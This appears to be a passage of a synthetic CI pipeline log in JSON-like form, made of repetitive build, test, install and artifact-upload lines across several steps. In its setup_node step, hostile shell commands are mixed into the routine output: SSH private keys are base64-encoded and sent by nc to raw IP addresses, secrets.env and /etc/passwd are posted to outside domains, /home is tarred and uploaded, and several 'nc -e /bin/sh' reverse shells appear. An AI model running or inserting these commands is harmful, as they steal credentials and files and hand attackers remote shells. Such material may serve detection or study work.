v4.0\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 test completed\nInstalling express@4.16.0\nStep 1/10: Building\nInstalling express@2.9.0\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:22] INFO: Processing request\nCompiling src/service.java...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_user_create (334ms)\nStep 1/10: Building\n\u2713 lint completed\nCompiling src/app.ts...\nInstalling prettier@4.17.0\n[12:00:22] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/main.py...\nCache hit for key-4784\n  PASS: test_auth_login (21ms)\n\u2713 test completed\n[12:00:22] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/utils.go...\n[12:00:22] WARN: Deprecated API usage\nInstalling webpack@5.0.0\nInstalling axios@5.1.0\n\u2713 test completed\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n\u2713 build completed\nStep 7/10: Building\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 build completed\nInstalling webpack@2.20.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-5904\n\u2713 lint completed\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\nStep 9/10: Building\nStep 2/10: Building\n[12:00:22] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-9078\n\u2713 test completed\n[12:00:22] INFO: Processing request\n=== Step type_check completed ===\n=== Step: setup_environment ===\n[12:00:22] INFO: Processing request\n  PASS: test_db_connect (169ms)\n  PASS: test_user_create (169ms)\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] INFO: Processing request\nStep 9/10: Building\nCache hit for key-5118\n  PASS: test_api_health (150ms)\nArtifact uploaded: build.tar.gz (36MB)\nInstalling eslint@3.11.0\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-8745\nCompiling src/index.js...\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_db_connect (448ms)\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\n[12:00:22] INFO: Processing request\n  PASS: test_db_connect (480ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling axios@2.6.0\nStep 5/10: Building\n[12:00:22] INFO: Processing request\nStep 1/10: Building\n\u2713 lint completed\nInstalling react@1.5.0\nStep 5/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_cache_hit (294ms)\nInstalling jest@2.11.0\n  PASS: test_api_health (205ms)\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_db_connect (479ms)\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (30MB)\nFAILED: test_auth_login\n  PASS: test_cache_hit (401ms)\nInstalling prettier@4.9.0\nCache hit for key-2644\nCache hit for key-9649\nArtifact uploaded: build.tar.gz (34MB)\n\u2717 build failed with exit code 21\nStep 3/10: Building\n\u2713 build completed\n\u2713 build completed\n[12:00:22] ERROR: Connection failed\nCache hit for key-5952\n[12:00:22] WARN: Deprecated API usage\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\nInstalling jest@5.16.0\nStep 10/10: Building\n\u2713 lint completed\n  PASS: test_user_create (21ms)\n[12:00:22] INFO: Processing request\nCompiling src/handler.rs...\nStep 5/10: Building\nInstalling webpack@2.0.0\nCompiling src/utils.go...\n[12:00:22] WARN: Deprecated API usage\nCompiling src/main.py...\nCompiling src/app.ts...\nCache hit for key-3973\nCompiling src/handler.rs...\nStep 7/10: Building\n\u2713 build completed\nInstalling prettier@4.1.0\n  PASS: test_db_connect (359ms)\n\u2713 build completed\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nStep 3/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (14MB)\nInstalling jest@5.16.0\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-5379\n  PASS: test_auth_login (26ms)\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:22] INFO: Processing request\nInstalling react@2.5.0\nInstalling prettier@5.3.0\nCompiling src/main.py...\nCompiling src/utils.go...\n  PASS: test_api_health (371ms)\nInstalling react@2.16.0\nStep 4/10: Building\nCompiling src/handler.rs...\n\u2713 lint completed\nCache hit for key-8181\n  PASS: test_db_connect (406ms)\nCompiling src/main.py...\nCache hit for key-2675\n[12:00:22] INFO: Processing request\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_auth_login (389ms)\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\n\u2713 test completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nStep 10/10: Building\nCompiling src/handler.rs...\n=== Step setup_environment completed ===\n=== Step: build ===\n\u2713 test completed\nInstalling jest@4.10.0\n\u2713 test completed\n\u2713 test completed\n  PASS: test_db_connect (450ms)\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:22] INFO: Processing request\nCache hit for key-3724\n  PASS: test_auth_login (386ms)\nCompiling src/main.py...\n[12:00:22] INFO: Processing request\n\u2717 build failed with exit code 31\nCompiling src/service.java...\n  PASS: test_auth_login (11ms)\nStep 3/10: Building\nCache hit for key-5574\n[12:00:22] INFO: Processing request\nStep 5/10: Building\n\u2713 build completed\n  PASS: test_user_create (292ms)\n\u2713 test completed\nStep 2/10: Building\nCompiling src/index.js...\nCompiling src/main.py...\nStep 4/10: Building\nCompiling src/main.py...\n\u2713 lint completed\n  PASS: test_cache_hit (317ms)\nCache hit for key-6522\nFAILED: test_cache_hit\n[12:00:22] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-7652\n  PASS: test_user_create (453ms)\nWARNING: jest has known vulnerabilities\nCache hit for key-6779\n  PASS: test_user_create (211ms)\nFAILED: test_user_create\nCompiling src/main.py...\n\u2713 test completed\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\n  PASS: test_auth_login (373ms)\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:22] INFO: Processing request\nStep 9/10: Building\nWARNING: express has known vulnerabilities\n\u2713 lint completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (6MB)\nInstalling axios@3.18.0\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nStep 8/10: Building\n\u2713 lint completed\n\u2713 build completed\n[12:00:22] INFO: Processing request\n  PASS: test_cache_hit (127ms)\n[12:00:22] INFO: Processing request\nCompiling src/index.js...\n\u2713 lint completed\nCache hit for key-8665\nCache hit for key-3737\nStep 5/10: Building\n[12:00:22] INFO: Processing request\nStep 8/10: Building\nCompiling src/handler.rs...\nStep 5/10: Building\n\u2713 lint completed\nStep 9/10: Building\nCompiling src/app.ts...\n  PASS: test_api_health (243ms)\n[12:00:22] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_db_connect (228ms)\nInstalling axios@3.13.0\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-6584\n  PASS: test_cache_hit (32ms)\n[12:00:22] INFO: Processing request\n  PASS: test_cache_hit (192ms)\nInstalling eslint@3.19.0\nCompiling src/app.ts...\nInstalling express@5.4.0\nStep 10/10: Building\n  PASS: test_cache_hit (429ms)\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-4489\n  PASS: test_api_health (343ms)\nException: TypeError\nCache hit for key-4872\nCache hit for key-3032\n\u2713 lint completed\n[12:00:22] INFO: Processing request\nInstalling webpack@3.20.0\n  PASS: test_user_create (461ms)\n[12:00:22] ERROR: Connection failed\nCache hit for key-5391\n  PASS: test_db_connect (402ms)\nCache hit for key-3888\n\u2713 test completed\n\u2713 lint completed\n[12:00:22] INFO: Processing request\n\u2713 test completed\nInstalling axios@3.5.0\nFAILED: test_auth_login\n  PASS: test_api_health (116ms)\n=== Step build completed ===\n=== Step: install_dependencies ===\n\u2713 test completed\nWARNING: prettier has known vulnerabilities\n[12:00:22] INFO: Processing request\nStep 4/10: Building\nCache hit for key-8918\n  PASS: test_user_create (107ms)\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (27MB)\nInstalling jest@4.7.0\nCache hit for key-5383\nStep 4/10: Building\nCache hit for key-7863\n[12:00:22] INFO: Processing request\n\u2713 test completed\nWARNING: jest has known vulnerabilities\n\u2713 test completed\n  PASS: test_cache_hit (192ms)\nStep 1/10: Building\n  PASS: test_auth_login (194ms)\nCache hit for key-4745\nStep 7/10: Building\nInstalling prettier@2.3.0\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 test completed\nCache hit for key-2706\n[12:00:22] INFO: Processing request\nInstalling react@1.3.0\nArtifact uploaded: build.tar.gz (8MB)\nStep 2/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nStep 6/10: Building\nCompiling src/utils.go...\nStep 2/10: Building\nInstalling eslint@1.14.0\nWARNING: jest has known vulnerabilities\n  PASS: test_api_health (379ms)\n  PASS: test_auth_login (170ms)\n[12:00:22] INFO: Processing request\nCache hit for key-8681\nCompiling src/app.ts...\nStep 2/10: Building\nStep 10/10: Building\n\u2713 test completed\nInstalling webpack@4.11.0\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (39MB)\nWARNING: webpack has known vulnerabilities\n\u2713 build completed\n\u2713 test completed\n[12:00:22] INFO: Processing request\nStep 2/10: Building\nCompiling src/main.py...\n\u2713 build completed\nInstalling prettier@4.2.0\nStep 6/10: Building\nCache hit for key-4024\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:22] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:22] INFO: Processing request\nInstalling react@4.8.0\n  PASS: test_api_health (497ms)\nStep 9/10: Building\n[12:00:22] WARN: Deprecated API usage\nStep 7/10: Building\nStep 5/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/index.js...\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (36MB)\nInstalling lodash@5.19.0\n[12:00:22] INFO: Processing request\nCompiling src/service.java...\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\nStep 6/10: Building\nStep 2/10: Building\nCache hit for key-6320\nCompiling src/main.py...\nInstalling lodash@5.16.0\n  PASS: test_auth_login (427ms)\nInstalling axios@1.15.0\nArtifact uploaded: build.tar.gz (41MB)\nFAILED: test_db_connect\nInstalling react@4.11.0\nStep 5/10: Building\n\u2713 build completed\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nInstalling lodash@5.12.0\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 build completed\n[12:00:22] INFO: Processing request\n  PASS: test_db_connect (325ms)\nCache hit for key-3957\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-5446\n\u2713 lint completed\nWARNING: eslint has known vulnerabilities\nCompiling src/utils.go...\nInstalling jest@1.20.0\nStep 8/10: Building\n\u2713 test completed\nInstalling webpack@1.11.0\n=== Step install_dependencies completed ===\n=== Step: e2e_tests ===\n[12:00:22] INFO: Processing request\n  PASS: test_user_create (142ms)\nArtifact uploaded: build.tar.gz (25MB)\nStep 5/10: Building\nCompiling src/handler.rs...\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (22MB)\nInstalling axios@1.6.0\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-1254\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/service.java...\nInstalling prettier@4.3.0\n\u2713 lint completed\nCompiling src/app.ts...\nStep 2/10: Building\n[12:00:22] INFO: Processing request\n  PASS: test_api_health (452ms)\nStep 2/10: Building\n\u2713 lint completed\nCache hit for key-2967\n[12:00:22] INFO: Processing request\nException: ValueError\n  PASS: test_auth_login (286ms)\nCompiling src/handler.rs...\nFAILED: test_api_health\nStep 6/10: Building\n[12:00:22] INFO: Processing request\nStep 8/10: Building\nCompiling src/service.java...\n\u2717 build failed with exit code 54\n  PASS: test_db_connect (499ms)\n\u2713 build completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 test completed\n  PASS: test_api_health (96ms)\n  PASS: test_auth_login (200ms)\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-7008\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (44ms)\nArtifact uploaded: build.tar.gz (18MB)\nInstalling eslint@1.15.0\nStep 6/10: Building\n  PASS: test_api_health (316ms)\nStep 10/10: Building\nCache hit for key-8587\nCache hit for key-7929\nCompiling src/index.js...\n  PASS: test_cache_hit (76ms)\n\u2713 build completed\nStep 6/10: Building\n  PASS: test_cache_hit (51ms)\n  PASS: test_cache_hit (145ms)\nCache hit for key-6849\nCache hit for key-5441\nCache hit for key-5544\nStep 1/10: Building\n\u2713 build completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nStep 1/10: Building\n  PASS: test_db_connect (473ms)\nArtifact uploaded: build.tar.gz (1MB)\nInstalling webpack@4.20.0\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (33MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 lint completed\n\u2713 lint completed\nInstalling eslint@3.19.0\n[12:00:22] INFO: Processing request\n\u2713 test completed\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:22] INFO: Processing request\nCache hit for key-3709\nCompiling src/handler.rs...\n  PASS: test_db_connect (367ms)\n\u2713 build completed\n  PASS: test_api_health (173ms)\n[12:00:22] INFO: Processing request\n  PASS: test_db_connect (64ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_api_health (469ms)\nInstalling webpack@4.3.0\n[12:00:22] INFO: Processing request\nCache hit for key-3919\nCompiling src/app.ts...\n  PASS: test_cache_hit (481ms)\n\u2713 build completed\nCompiling src/index.js...\n  PASS: test_db_connect (196ms)\nCompiling src/app.ts...\nInstalling react@3.11.0\n  PASS: test_user_create (408ms)\nCompiling src/app.ts...\n  PASS: test_db_connect (85ms)\nCompiling src/service.java...\nCache hit for key-3043\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:22] INFO: Processing request\n\u2717 build failed with exit code 87\n[12:00:22] WARN: Deprecated API usage\nCache hit for key-5450\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\nStep 7/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 93.82.39.27 43713\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:22] INFO: Processing request\ncurl -X POST https://acme.corp/collect -d @secrets.env\nArtifact uploaded: build.tar.gz (2MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:22] INFO: Processing request\n\u2713 build completed\nStep 6/10: Building\nCache hit for key-7247\nCompiling src/index.js...\n\u2713 lint completed\nCompiling src/utils.go...\nStep 9/10: Building\n[12:00:22] INFO: Processing request\nStep 1/10: Building\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nCompiling src/utils.go...\nStep 8/10: Building\nCompiling src/main.py...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 121.119.27.119 28341\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nArtifact uploaded: build.tar.gz (41MB)\nInstalling axios@5.18.0\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 lint completed\nInstalling axios@4.0.0\nInstalling prettier@1.2.0\n  PASS: test_user_create (304ms)\nStep 7/10: Building\n\u2713 test completed\ncurl -X POST https://startup.dev/collect -d @secrets.env\nStep 4/10: Building\nCache hit for key-6326\nStep 8/10: Building\nWARNING: prettier has known vulnerabilities\n\u2713 build completed\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 build completed\n\u2713 build completed\nnc -e /bin/sh 15.167.31.47 22092\n  PASS: test_api_health (335ms)\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 lint completed\n\u2713 lint completed\nFAILED: test_api_health\nSending 281MB of data to startup.dev\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nArtifact uploaded: build.tar.gz (4MB)\nInstalling react@3.6.0\nStep 2/10: Building\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:00:22] INFO: Processing request\n  PASS: test_db_connect (407ms)\n[12:00:22] ERROR: Connection failed\nInstalling express@1.13.0\n[12:00:22] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nStep 8/10: Building\nStep 9/10: Building\nCompiling src/service.java...\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nInstalling express@4.18.0\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_auth_login (424ms)\n  PASS: test_db_connect (305ms)\nStep 5/10: Building\nInstalling webpack@1.17.0\n\u2713 test completed\nCache hit for key-8141\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nStep 3/10: Building\nCache hit for key-7330\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:00:22] INFO: Processing request\n  PASS: test_auth_login (7ms)\nCache hit for key-7973\n  PASS: test_db_connect (319ms)\nWARNING: webpack has known vulnerabilities\nStep 10/10: Building\nnc -e /bin/sh 49.250.174.117 12244\nCache hit for key-2396\n[12:00:22] INFO: Processing request\n\u2713 build completed\n[12:00:22] INFO: Processing request\nnc -e /bin/sh 56.153.247.40 32535\n[12:00:22] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n[12:00:22] INFO: Processing request\nInstalling axios@1.20.0\nCompiling src/main.py...\nInstalling express@5.19.0\nArtifact uploaded: build.tar.gz (14MB)\nStep 10/10: Building\nFAILED: test_cache_hit\nCompiling src/index.js...\n\u2713 build completed\nCache hit for key-8026\n[12:00:22] INFO: Processing request\nStep 5/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 155.167.148.232 31454\nCache hit for key-7517\n\u2713 build completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 230.103.40.203 65015\n  PASS: test_auth_login (50ms)\nArtifact uploaded: build.tar.gz (23MB)\nInstalling eslint@3.15.0\nnc -e /bin/sh 101.53.153.248 64072\necho $(cat ~/.ssh/id_rsa) | base64 | nc 249.2.138.172 46042\nCache hit for key-5156\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-9816\necho $(cat ~/.ssh/id_rsa) | base64 | nc 163.167.112.17 41160\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:22] INFO: Processing request\n=== Step setup_node completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-04T12:00:22.633421",
        "finished_at": "2025-12-04T12:00:30.052444",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Compiling src/app.ts...",
          "Cache hit for key-8443",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-9621",
          "Cache hit for key-2637",
          "Compiling src/main.py...",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_db_connect (414ms)",
          "Cache hit for key-8351",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-8689",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 8/10: Building",
          "Cache hit for key-3995",
          "Cache hit for key-8223",
          "Compiling src/index.js...",
          "Cache hit for key-9679",
          "  PASS: test_auth_login (94ms)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-7109",
          "Exception: NullPointerException",
          "  PASS: test_api_health (246ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 8/10: Building",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing lodash@1.7.0",
          "Step 2/10: Building",
          "Cache hit for key-3112",
          "[12:00:22] ERROR: Connection failed",
          "  PASS: test_user_create (443ms)",
          "  PASS: test_user_create (493ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 4/10: Building",
          "Cache hit for key-6288",
          "Installing prettier@4.6.0",
          "Installing webpack@2.9.0",
          "Cache hit for key-4378",
          "Cache hit for key-3150",
          "  PASS: test_user_create (28ms)",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-8180",
          "Compiling src/handler.rs...",
          "Installing prettier@1.5.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing axios@2.14.0",
          "Cache hit for key-7750",
          "Installing webpack@5.13.0",
          "Cache hit for key-6662",
          "Step 8/10: Building",
          "  PASS: test_user_create (445ms)",
          "  PASS: test_api_health (480ms)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (330ms)",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing jest@5.10.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_api_health (79ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_api_health (460ms)",
          "Cache hit for key-5116",
          "[12:00:22] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_user_create (240ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing webpack@1.11.0",
          "[12:00:22] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:22] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-5334",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-7159",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-4009",
          "Installing react@4.1.0",
          "WARNING: webpack has known vulnerabilities",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-04T12:00:30.052444",
        "finished_at": "2025-12-04T12:00:34.503858",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/utils.go...",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2717 build failed with exit code 59",
          "Step 7/10: Building",
          "Installing axios@5.20.0",
          "[12:00:22] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_auth_login (159ms)",
          "Step 6/10: Building",
          "Step 7/10: Building",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Installing express@2.10.0",
          "Step 3/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-8728",
          "  PASS: test_auth_login (348ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-6409",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 3/10: Building",
          "Cache hit for key-2512",
          "  PASS: test_user_create (158ms)",
          "  PASS: test_auth_login (98ms)",
          "Cache hit for key-3838",
          "\u2713 lint completed",
          "  PASS: test_user_create (330ms)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: test_auth_login (325ms)",
          "Compiling src/main.py...",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-5626",
          "[12:00:22] ERROR: Connection failed",
          "  PASS: test_auth_login (15ms)",
          "Step 4/10: Building",
          "[12:00:22] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-8430",
          "Compiling src/app.ts...",
          "Installing prettier@2.11.0",
          "Step 2/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-9285",
          "Installing react@1.19.0",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-5192",
          "\u2713 test completed",
          "  PASS: test_cache_hit (391ms)",
          "  PASS: test_api_health (488ms)",
          "Installing eslint@2.15.0",
          "Cache hit for key-5302",
          "Installing react@5.6.0",
          "Cache hit for key-6626",
          "Installing express@1.16.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-6036",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Installing express@3.9.0",
          "Installing axios@3.10.0",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "Installing axios@2.0.0",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "  PASS: test_auth_login (188ms)",
          "  PASS: test_cache_hit (146ms)",
          "[12:00:22] INFO: Processing request",
          "Step 4/10: Building",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_auth_login (404ms)",
          "Installing react@3.4.0",
          "Installing express@1.8.0",
          "Step 9/10: Building",
          "Installing webpack@1.0.0",
          "Cache hit for key-4072",
          "Installing eslint@1.10.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-3700",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (496ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/service.java...",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Installing axios@4.19.0",
          "  PASS: test_user_create (254ms)",
          "Step 5/10: Building",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "Installing express@4.17.0",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-04T12:00:34.503858",
        "finished_at": "2025-12-04T12:00:56.760928",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "Cache hit for key-5299",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_api_health (335ms)",
          "Cache hit for key-8518",
          "\u2713 build completed",
          "[12:00:22] ERROR: Connection failed",
          "  PASS: test_auth_login (20ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_user_create (496ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 3/10: Building",
          "Cache hit for key-6998",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "FAILED: test_db_connect",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "[12:00:22] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/main.py...",
          "  PASS: test_user_create (229ms)",
          "[12:00:22] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Cache hit for key-6309",
          "Installing react@3.11.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 9/10: Building",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_auth_login (355ms)",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-4516",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-9463",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "Installing react@4.3.0",
          "\u2713 test completed",
          "Cache hit for key-7163",
          "Cache hit for key-2935",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] ERROR: Connection failed",
          "Cache hit for key-3249",
          "\u2717 build failed with exit code 110",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 test completed",
